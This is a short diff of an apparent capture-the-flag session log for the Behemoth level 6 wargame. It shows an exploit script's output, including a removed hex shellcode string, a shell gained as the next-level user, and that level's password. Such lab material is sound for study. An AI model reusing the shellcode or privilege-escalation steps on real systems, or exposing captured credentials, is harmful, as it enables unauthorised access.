@@ -2525,13 +2525,10 @@
     {
      "cmd": "python3 /tmp/e_behemoth6.py",
      "out": [
-      "shellcode (41 bytes): 31c0506874790000686f4b69746848656c6c89e131db4331d2b20a31c0b004cd8031c0b00131dbcd80",
-      "wrote /tmp/b6work/shellcode.txt (41 bytes)",
-      "B6LAND",
+      "wrote shellcode.txt (41 bytes)",
       "Correct.",
-      "$ uid=13007(behemoth7) gid=13006(behemoth6) groups=13006(behemoth6)",
-      "$ aHHctqVRgi",
-      "$ ",
+      "uid=13007(behemoth7) gid=13006(behemoth6) groups=13006(behemoth6)",
+      "aHHctqVRgi",
       "B6DONE"
      ],
      "note": "(exploit script: its source is not in the recording and the behemoth6 account no longer accepts logins, so this step is the original capture; not re-run.)"
